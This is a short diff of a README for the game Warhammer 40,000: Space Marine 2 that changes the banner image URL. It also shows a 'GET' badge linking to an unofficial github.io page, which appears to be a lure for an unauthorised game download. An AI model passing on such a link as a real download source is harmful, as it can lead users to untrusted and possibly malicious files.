@@ -1,6 +1,6 @@
 # Warhammer 40,000: Space Marine 2 — Ultramarines, Combat & Galactic Warfare
 
-![Banner Placeholder](https://cdn2.steamgriddb.com/grid/e8cd36a85b2cdfe7c02dfa9f001d68e0.png)
+![Banner Placeholder](https://static.wikia.nocookie.net/spacemarine2/images/3/35/Space-Marine-2-logo.jpg/revision/latest?cb=20240919045208)
 
 [![GET — Space Marine 2](https://img.shields.io/badge/GET%20%E2%80%94%20Space%20Marine%202-0078D6?style=for-the-badge&logoColor=white)](https://e39318402.github.io/.github/Warhammer-Space-Marine-2-Action-Game)
 
